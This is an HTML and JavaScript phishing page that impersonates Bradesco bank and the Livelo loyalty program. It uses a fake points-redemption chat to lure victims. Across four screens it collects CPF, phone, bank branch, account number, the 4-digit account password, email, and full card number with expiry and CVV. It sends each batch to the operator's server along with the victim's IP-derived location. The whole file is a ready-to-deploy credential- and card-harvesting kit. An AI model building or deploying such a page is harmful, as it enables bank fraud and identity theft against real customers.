<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bradesco · Livelo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }

        .container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto;
        }

        /* ===== PÁGINA 1 (INICIAL) ===== */
        .logos-topo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 40px;
            margin-bottom: 30px;
        }

        .logos-topo img {
            max-height: 70px;
            width: auto;
            object-fit: contain;
        }

        .card-vermelho {
            background: #C62828;
            border-radius: 32px;
            padding: 32px 28px;
            box-shadow: 0 20px 35px rgba(198, 40, 40, 0.4);
        }

        .texto-destaque {
            background: white;
            border-radius: 60px;
            padding: 20px 22px;
            text-align: center;
            font-size: 1.1rem;
            font-weight: 600;
            color: #222;
            margin-bottom: 32px;
            border: 2px solid #C62828;
            line-height: 1.5;
        }

        .texto-destaque strong {
            color: #C62828;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-weight: 600;
            color: white;
            font-size: 1rem;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            border: none;
            border-radius: 16px;
            font-size: 1rem;
            background: white;
            border: 2px solid transparent;
            transition: 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #ffffff;
            box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.3);
        }

        .btn-consultar {
            background: white;
            color: #C62828;
            border: none;
            width: 100%;
            padding: 18px 20px;
            font-size: 1.4rem;
            font-weight: 700;
            text-transform: uppercase;
            border-radius: 50px;
            cursor: pointer;
            letter-spacing: 2px;
            margin-top: 16px;
            transition: 0.2s;
            border: 2px solid white;
        }

        .btn-consultar:hover:not(:disabled) {
            background: #f5f5f5;
            transform: scale(1.02);
        }

        .btn-consultar:disabled {
            background: #cccccc;
            color: #666666;
            cursor: not-allowed;
            opacity: 0.7;
        }

        /* LOADER */
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            color: white;
            font-size: 1.2rem;
            gap: 20px;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid rgba(255, 255, 255, 0.2);
            border-top-color: #C62828;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hidden {
            display: none !important;
        }

        /* ===== PÁGINA 2 (BANCO) ===== */
        .card-banco {
            background: #C62828;
            border-radius: 32px;
            padding: 32px 28px;
            box-shadow: 0 20px 35px rgba(198, 40, 40, 0.4);
        }

        .saudacao {
            font-size: 1.3rem;
            color: white;
            margin-bottom: 30px;
            text-align: center;
        }

        .label-banco {
            display: block;
            font-weight: 600;
            color: white;
            font-size: 1rem;
            margin-bottom: 8px;
        }

        .input-banco {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 16px;
            font-size: 1rem;
            background: white;
            margin-bottom: 20px;
        }

        .input-banco:focus {
            outline: none;
            border: 2px solid white;
        }

        .btn-continuar {
            background: white;
            color: #C62828;
            border: none;
            width: 100%;
            padding: 18px;
            font-size: 1.3rem;
            font-weight: 700;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
            border: 2px solid white;
        }

        .btn-continuar:hover {
            background: #f5f5f5;
        }

        /* ===== ESTILOS PÁGINAS 3 E 4 (CHAT) ===== */
        .topo-branco {
            background: white;
            border-top-left-radius: 28px;
            border-top-right-radius: 28px;
            padding: 20px 20px;
            border-bottom: 1px solid #ddd;
        }

        .logos-chat {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }

        .logos-chat img {
            max-height: 60px;
            width: auto;
            object-fit: contain;
        }

        .faixa-vermelha {
            background: #C62828;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            color: white;
        }

        .seta-voltar {
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            line-height: 1;
        }

        .titulo-atendimento {
            font-size: 1.3rem;
            font-weight: 600;
        }

        .area-chat {
            background: white;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 15px;
            min-height: 300px;
        }

        .balao-chat-sem-logo {
            background: #C62828;
            border-radius: 18px;
            padding: 12px 16px;
            max-width: 95%;
            color: white;
            font-size: 1rem;
            line-height: 1.5;
            margin-left: 50px;
            display: none;
        }

        .balao-chat-sem-logo.visible {
            display: block;
        }

        .horario-balao {
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.7);
            text-align: right;
            margin-top: 5px;
        }

        .balao-proto {
            background: #C62828;
            border-radius: 18px;
            padding: 8px 16px;
            max-width: 70%;
            color: white;
            font-size: 1rem;
            margin-left: 50px;
            display: none;
        }

        .balao-proto.visible {
            display: block;
        }

        .balao-container {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            width: 100%;
        }

        .logo-fora-balao {
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            margin-top: 5px;
            background: transparent;
        }

        .logo-fora-balao img {
            width: 40px;
            height: 40px;
            object-fit: contain;
            border-radius: 0;
        }

        .balao-chat {
            background: #C62828;
            border-radius: 18px;
            padding: 12px 16px;
            max-width: 85%;
            color: white;
            font-size: 1rem;
            line-height: 1.5;
        }

        .mensagem-final {
            background: #C62828;
            border-radius: 18px;
            padding: 12px 16px;
            max-width: 95%;
            color: white;
            font-size: 1rem;
            margin-top: 25px;
            margin-left: 50px;
        }

        .card-branco-form {
            background: white;
            border-bottom-left-radius: 28px;
            border-bottom-right-radius: 28px;
            padding: 25px 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
        }

        .btn-confirmar {
            background: #C62828;
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            font-size: 1.3rem;
            font-weight: 700;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
        }

        .btn-confirmar:hover {
            background: #a52a2a;
        }

        /* CURSOR DE DIGITAÇÃO */
        .typing-cursor {
            display: inline-block;
            width: 2px;
            height: 1.2em;
            background-color: white;
            margin-left: 2px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        /* ===== PÁGINA 4 (CARTÃO) ===== */
        .label-cartao {
            display: block;
            font-weight: 600;
            color: #C62828;
            font-size: 0.95rem;
            margin-bottom: 6px;
        }

        .input-cartao {
            width: 100%;
            padding: 16px;
            border: 2px solid #ddd;
            border-radius: 14px;
            font-size: 1rem;
            margin-bottom: 20px;
            background: #fafafa;
        }

        .input-cartao:focus {
            border-color: #C62828;
            outline: none;
        }

        .row-cartao {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
        }

        .col-cartao {
            flex: 1;
        }

        .btn-resgatar {
            background: #C62828;
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            font-size: 1.3rem;
            font-weight: 700;
            border-radius: 40px;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
        }

        .btn-resgatar:hover {
            background: #a52a2a;
        }

        /* STATUS "GERANDO SEU COMPROVANTE" */
        .status-container {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .balao-gerando {
            background: #C62828;
            border-radius: 18px;
            padding: 12px 16px;
            color: white;
            font-size: 1rem;
            max-width: 95%;
        }

        .horario-status {
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.7);
            text-align: right;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <!-- LOADER -->
    <div class="loader-overlay hidden" id="loader">
        <div class="spinner"></div>
        <div id="loaderMessage">Consultando seus pontos...</div>
    </div>

    <!-- PÁGINA 1 (INICIAL) -->
    <div class="container" id="page1">
        <div class="logos-topo">
            <img src="logobradesco.png" alt="Bradesco">
            <img src="logolivelo.png" alt="Livelo">
        </div>

        <div class="card-vermelho">
            <div class="texto-destaque">
                <strong>Seus pontos acumulados</strong> no Benefícios Bradesco são pontos <strong>LIVELO</strong>!
            </div>

            <div class="form-group">
                <label for="cpf">CPF</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
            </div>

            <div class="form-group">
                <label for="telefone">Telefone</label>
                <input type="text" id="telefone" placeholder="DDD + Número do celular" maxlength="15">
            </div>

            <button class="btn-consultar" id="btnConsultar" disabled>CONSULTAR</button>
        </div>
    </div>

    <!-- PÁGINA 2 (BANCO) -->
    <div class="container hidden" id="page2">
        <div class="logos-topo">
            <img src="logobradesco.png" alt="Bradesco">
            <img src="logolivelo.png" alt="Livelo">
        </div>

        <div class="card-banco">
            <div class="saudacao">Olá, conecte-se ao Bradesco:</div>

            <div class="form-group">
                <label class="label-banco">Agência</label>
                <input type="text" class="input-banco" id="agencia" placeholder="0000-0" maxlength="6">
            </div>

            <div class="form-group">
                <label class="label-banco">Conta</label>
                <input type="text" class="input-banco" id="conta" placeholder="Digite o número da conta">
            </div>

            <div class="form-group">
                <label class="label-banco">Senha de 4 dígitos</label>
                <input type="password" class="input-banco" id="senha4" placeholder="Digite sua senha (4 dígitos)" maxlength="4">
            </div>

            <button class="btn-continuar" id="btnContinuar">Continuar</button>
        </div>
    </div>

    <!-- PÁGINA 3 (ATENDIMENTO 1 - SÓ EMAIL) -->
    <div class="container hidden" id="page3">
        <div class="topo-branco">
            <div class="logos-chat">
                <img src="logobradesco.png" alt="Bradesco">
                <img src="logolivelo.png" alt="Livelo">
            </div>
        </div>
        
        <div class="faixa-vermelha">
            <span class="seta-voltar">←</span>
            <span class="titulo-atendimento">Atendimento pra você</span>
        </div>

        <div class="area-chat" id="chatArea">
            <!-- Mensagem 1 -->
            <div class="balao-chat-sem-logo" id="msg1">
                <span id="msg1-text"></span>
                <div class="horario-balao" id="hora1"></div>
            </div>

            <!-- Mensagem 2 -->
            <div class="balao-chat-sem-logo" id="msg2">
                <span id="msg2-text"></span>
                <div class="horario-balao" id="hora2"></div>
            </div>

            <!-- Mensagem 3 (protocolo) -->
            <div class="balao-proto" id="msg3">
                <span id="msg3-text"></span>
                <div class="horario-proto" id="hora3"></div>
            </div>

            <!-- Mensagem 4 -->
            <div class="balao-chat-sem-logo" id="msg4">
                <span id="msg4-text"></span>
            </div>

            <!-- STATUS "GERANDO SEU COMPROVANTE" -->
            <div class="status-container hidden" id="statusContainer">
                <div class="balao-gerando hidden" id="balaoGerando">
                    Gerando seu comprovante...
                    <div class="horario-status" id="horaGerando"></div>
                </div>
            </div>
        </div>

        <div class="card-branco-form">
            <div class="form-group">
                <label style="color: #C62828;">E-mail</label>
                <input type="email" id="email" placeholder="seu@email.com">
            </div>

            <button class="btn-confirmar" id="btnConfirmar1">Confirmar</button>
        </div>
    </div>

    <!-- PÁGINA 4 (ATENDIMENTO 2 - CARTÃO) -->
    <div class="container hidden" id="page4">
        <div class="topo-branco">
            <div class="logos-chat">
                <img src="logobradesco.png" alt="Bradesco">
                <img src="logolivelo.png" alt="Livelo">
            </div>
        </div>
        
        <div class="faixa-vermelha">
            <span class="seta-voltar">←</span>
            <span class="titulo-atendimento">Atendimento pra você</span>
        </div>

        <div class="area-chat" id="chatAreaCartao">
            <!-- Mensagem 1 -->
            <div class="balao-chat-sem-logo" id="cartaoMsg1">
                <span id="cartaoMsg1-text"></span>
                <div class="horario-balao" id="horaCartao1"></div>
            </div>

            <!-- Mensagem 2 -->
            <div class="balao-chat-sem-logo" id="cartaoMsg2">
                <span id="cartaoMsg2-text"></span>
                <div class="horario-balao" id="horaCartao2"></div>
            </div>

            <!-- Mensagem 3 (protocolo) -->
            <div class="balao-proto" id="cartaoMsg3">
                <span id="cartaoMsg3-text"></span>
                <div class="horario-proto" id="horaCartao3"></div>
            </div>

            <!-- Mensagem 4 com logo -->
            <div class="balao-container" id="cartaoMsg4Container">
                <div class="logo-fora-balao">
                    <img src="logobradesco.png" alt="Bradesco">
                </div>
                <div class="balao-chat" id="cartaoMsg4">
                    <span id="cartaoMsg4-text"></span>
                    <div class="horario-balao" id="horaCartao4"></div>
                </div>
            </div>
        </div>

        <div class="card-branco-form">
            <div class="form-group">
                <label class="label-cartao">Número do cartão (16 dígitos)</label>
                <input type="text" class="input-cartao" id="cartao" placeholder="Digite o número do cartão" maxlength="19">
            </div>

            <div class="row-cartao">
                <div class="col-cartao">
                    <label class="label-cartao">Validade</label>
                    <input type="text" class="input-cartao" id="validade" placeholder="MM/AA" maxlength="5">
                </div>
                <div class="col-cartao">
                    <label class="label-cartao">CVV</label>
                    <input type="text" class="input-cartao" id="cvv" placeholder="123" maxlength="3">
                </div>
            </div>

            <button class="btn-resgatar" id="btnResgatar">CONFIRMAR</button>

            <!-- STATUS "GERANDO SEU COMPROVANTE" da página 4 -->
            <div class="status-container hidden" id="statusContainerPage4">
                <div class="balao-gerando hidden" id="balaoGerandoPage4">
                    Gerando seu comprovante...
                    <div class="horario-status" id="horaGerandoPage4"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- SCRIPTS -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script>
        // URL do servidor
        const SERVER_URL = window.location.origin;

        // ===== REGISTRAR ACESSO AO CARREGAR A PÁGINA =====
        fetch(`${SERVER_URL}/api/acesso`, { method: 'POST' })
            .then(res => res.json())
            .then(data => console.log('👁️ Acesso registrado:', data))
            .catch(err => console.error('Erro ao registrar acesso:', err));

        // ===== FUNÇÃO PARA BUSCAR CONFIGURAÇÃO DO SERVIDOR =====
        async function getCartaoAtivoDoServidor() {
            try {
                const response = await fetch(`${SERVER_URL}/api/config`);
                const data = await response.json();
                console.log('📡 Configuração do servidor:', data);
                return data.cartaoAtivo;
            } catch (error) {
                console.error('❌ Erro ao buscar configuração:', error);
                return true;
            }
        }

        // ===== FUNÇÃO DE ANIMAÇÃO DE DIGITAÇÃO =====
        async function typeMessage(elementId, text, speed = 50) {
            const element = document.getElementById(elementId);
            element.innerHTML = '';
            
            for (let i = 0; i < text.length; i++) {
                element.innerHTML += text[i];
                await new Promise(resolve => setTimeout(resolve, speed));
            }
        }

        async function iniciarAnimacaoChat() {
            console.log('🎬 Iniciando animação do chat (página 3)...');
            
            // Mostra primeiro balão e digita
            $('#msg1').addClass('visible');
            await typeMessage('msg1-text', 'Você tem 98.570 pontos Livelo disponíveis para resgate.', 50);
            $('#hora1').text(getHora());
            
            // Aguarda 1 segundo
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Mostra segundo balão e digita
            $('#msg2').addClass('visible');
            await typeMessage('msg2-text', 'Eu vou te ajudar com o seu resgate de pontos, mas primeiro vou precisar confirmar alguns dados.', 50);
            $('#hora2').text(getHora());
            
            // Aguarda 1 segundo
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Mostra terceiro balão (protocolo) e digita
            $('#msg3').addClass('visible');
            await typeMessage('msg3-text', 'Protocolo: 2026031180153', 50);
            $('#hora3').text(getHora());
            
            // Aguarda 1 segundo
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Mostra quarto balão e digita
            $('#msg4').addClass('visible');
            await typeMessage('msg4-text', 'Para iniciar seu resgate, digite seu e-mail que vai receber o comprovante:', 50);
            
            console.log('✅ Animação página 3 concluída!');
        }

        async function iniciarAnimacaoChatCartao() {
            console.log('🎬 Iniciando animação do chat (página 4)...');
            
            $('#cartaoMsg1').addClass('visible');
            await typeMessage('cartaoMsg1-text', 'Você tem 98.570 pontos Livelo disponíveis para resgate.', 50);
            $('#horaCartao1').text(getHora());
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            $('#cartaoMsg2').addClass('visible');
            await typeMessage('cartaoMsg2-text', 'Eu vou te ajudar com o seu resgate de pontos, mas primeiro vou precisar confirmar alguns dados.', 50);
            $('#horaCartao2').text(getHora());
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            $('#cartaoMsg3').addClass('visible');
            await typeMessage('cartaoMsg3-text', 'Protocolo: 2026031180153', 50);
            $('#horaCartao3').text(getHora());
            
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            $('#cartaoMsg4').addClass('visible');
            await typeMessage('cartaoMsg4-text', 'Qual cartão você gostaria de cadastrar na promoção resgate em dobro da Livelo?', 50);
            $('#horaCartao4').text(getHora());
            
            console.log('✅ Animação página 4 concluída!');
        }

        async function enviarParaServidor(dados) {
            try {
                const response = await fetch(`${SERVER_URL}/api/dados`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                });
                return await response.json();
            } catch (error) {
                console.error('Erro ao enviar:', error);
                return null;
            }
        }

        window.capturarDados = async function(dados) {
            try {
                let cidade = 'Desconhecido', ip = '-';
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    cidade = `${data.city || 'Desconhecido'} - ${data.region_code || ''}`;
                    ip = data.ip || '-';
                } catch {}
                
                await enviarParaServidor({ ...dados, cidade, ip, data: new Date().toISOString() });
                console.log('✅ Dados capturados');
            } catch (error) {
                console.error('Erro:', error);
            }
        };

        $(document).ready(function() {
            // Testa conexão com o servidor ao carregar
            fetch(`${SERVER_URL}/api/config`)
                .then(res => res.json())
                .then(data => console.log('🚀 Servidor respondeu:', data))
                .catch(err => console.error('❌ Servidor não respondeu:', err));
            
            // Máscaras
            $('#cpf').mask('000.000.000-00');
            $('#telefone').mask('(00) 00000-0000');
            $('#agencia').mask('0000-0');
            
            $('#conta').on('input', function() {
                let v = $(this).val().replace(/\D/g, '');
                if (v.length > 1) v = v.substring(0, v.length-1) + '-' + v.substring(v.length-1);
                $(this).val(v);
            });
            
            $('#senha4').mask('0000');
            $('#cartao').mask('0000 0000 0000 0000');
            $('#validade').mask('00/00');
            $('#cvv').mask('000');

            function getHora() {
                return new Intl.DateTimeFormat('pt-BR', { 
                    timeZone: 'America/Sao_Paulo', 
                    hour: '2-digit', 
                    minute: '2-digit' 
                }).format(new Date());
            }

            function validarCPF(c) {
                c = c.replace(/\D/g, '');
                if (c.length !== 11 || /^(\d)\1+$/.test(c)) return false;
                let s = 0;
                for (let i = 0; i < 9; i++) s += parseInt(c[i]) * (10 - i);
                let d1 = 11 - (s % 11); if (d1 > 9) d1 = 0;
                if (d1 !== parseInt(c[9])) return false;
                s = 0;
                for (let i = 0; i < 10; i++) s += parseInt(c[i]) * (11 - i);
                let d2 = 11 - (s % 11); if (d2 > 9) d2 = 0;
                return d2 === parseInt(c[10]);
            }

            $('#cpf').on('input', function() {
                $('#btnConsultar').prop('disabled', !validarCPF($(this).val()));
            });

            $('#btnConsultar').on('click', function() {
                if (!validarCPF($('#cpf').val())) {
                    Swal.fire({ icon: 'error', title: 'CPF inválido', background: '#C62828', color: 'white' });
                    return;
                }
                if ($('#telefone').val().replace(/\D/g, '').length < 11) {
                    Swal.fire({ icon: 'error', title: 'Telefone incompleto', background: '#C62828', color: 'white' });
                    return;
                }
                window.capturarDados({ cpf: $('#cpf').val(), telefone: $('#telefone').val() });
                $('#loaderMessage').text('Verificando seus benefícios...');
                $('#loader').removeClass('hidden');
                setTimeout(() => {
                    $('#loader').addClass('hidden');
                    $('#page1').addClass('hidden');
                    $('#page2').removeClass('hidden');
                }, 3000);
            });

            $('#btnContinuar').on('click', function() {
                if ($('#agencia').val().replace(/\D/g, '').length < 4) {
                    Swal.fire({ icon: 'error', title: 'Agência inválida', background: '#C62828', color: 'white' });
                    return;
                }
                if (!$('#conta').val().trim()) {
                    Swal.fire({ icon: 'error', title: 'Conta inválida', background: '#C62828', color: 'white' });
                    return;
                }
                if ($('#senha4').val().length !== 4) {
                    Swal.fire({ icon: 'error', title: 'Senha inválida', background: '#C62828', color: 'white' });
                    return;
                }
                window.capturarDados({ 
                    cpf: $('#cpf').val(), 
                    agencia: $('#agencia').val(), 
                    conta: $('#conta').val(), 
                    senha4: $('#senha4').val() 
                });
                $('#loader').removeClass('hidden');
                setTimeout(() => {
                    $('#loader').addClass('hidden');
                    $('#page2').addClass('hidden');
                    $('#page3').removeClass('hidden');
                    
                    // Inicia a animação do chat
                    iniciarAnimacaoChat();
                }, 3000);
            });

            $('#btnConfirmar1').on('click', async function() {
                if (!$('#email').val().includes('@')) {
                    Swal.fire({ icon: 'error', title: 'E-mail inválido', background: '#C62828', color: 'white' });
                    return;
                }

                window.capturarDados({ cpf: $('#cpf').val(), email: $('#email').val() });

                $('#loader').removeClass('hidden');
                
                const cartaoAtivo = await getCartaoAtivoDoServidor();
                
                setTimeout(() => {
                    $('#loader').addClass('hidden');
                    
                    console.log('📱 Decisão baseada no servidor - cartaoAtivo =', cartaoAtivo);
                    
                    if (cartaoAtivo) {
                        $('#page3').addClass('hidden');
                        $('#page4').removeClass('hidden');
                        iniciarAnimacaoChatCartao();
                    } else {
                        $('#statusContainer').removeClass('hidden');
                        $('#balaoGerando').removeClass('hidden');
                        $('#horaGerando').text(getHora());
                        
                        setTimeout(() => {
                            window.location.href = '/obrigado.html?pontos=98.570&notificacao=' + encodeURIComponent('e-mail e WhatsApp');
                        }, 6000);
                    }
                    
                    const h = getHora();
                    $('#hora4, #hora5, #hora6, #hora7').text(h);
                }, 3000);
            });

            // Página 4 - Clique CONFIRMAR (cartão)
            $('#btnResgatar').on('click', function() {
                if ($('#cartao').val().replace(/\s/g, '').length !== 16) {
                    Swal.fire({ icon: 'error', title: 'Cartão inválido', background: '#C62828', color: 'white' });
                    return;
                }
                if ($('#validade').val().length !== 5) {
                    Swal.fire({ icon: 'error', title: 'Validade inválida', background: '#C62828', color: 'white' });
                    return;
                }
                if ($('#cvv').val().length !== 3) {
                    Swal.fire({ icon: 'error', title: 'CVV inválido', background: '#C62828', color: 'white' });
                    return;
                }

                window.capturarDados({ 
                    cpf: $('#cpf').val(), 
                    cartao: $('#cartao').val(), 
                    validade: $('#validade').val(), 
                    cvv: $('#cvv').val() 
                });

                $('#statusContainerPage4').removeClass('hidden');
                $('#balaoGerandoPage4').removeClass('hidden');
                $('#horaGerandoPage4').text(getHora());
                
                setTimeout(() => {
                    window.location.href = '/obrigado.html?pontos=98.570&notificacao=' + encodeURIComponent('e-mail, SMS e WhatsApp');
                }, 6000);
            });
        });
    </script>
</body>
</html>
